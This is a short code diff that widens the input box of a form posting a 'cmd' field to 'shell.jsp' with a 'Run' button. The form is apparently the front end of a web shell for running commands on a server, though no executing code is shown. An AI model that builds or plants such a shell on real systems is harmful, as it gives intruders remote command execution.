@@ -1,5 +1,5 @@
 <FORM METHOD=GET ACTION='shell.jsp'>
-<INPUT id='cmd' name='cmd' type=text>
+<INPUT id='cmd' style="width:50%" name='cmd' type=text>
 <INPUT type=submit value='Run'>
 </FORM>
 <script>
